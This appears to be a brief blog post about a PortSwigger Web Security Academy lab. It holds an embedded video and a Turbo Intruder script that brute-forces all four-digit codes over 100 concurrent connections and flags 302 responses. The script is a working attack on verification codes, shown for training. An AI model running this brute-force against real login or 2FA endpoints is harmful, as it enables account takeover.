---
layout: post
title:  "PortSwigger WebSecurity Academy"
date:   2022-04-02
categories: 
---

<iframe width="560" height="315" src="https://www.youtube.com/embed/iYbM89TuZkw" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>


{% highlight python linenos=table %}
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=100,
                           requestsPerConnection=1,
                           pipeline=True
                           )
    engine.start()

    for i in range(10000):
        engine.queue(target.req, '{0:04}'.format(i))

def handleResponse(req, interesting):
    if '302' in req.response:
        table.add(req)

{% endhighlight %}

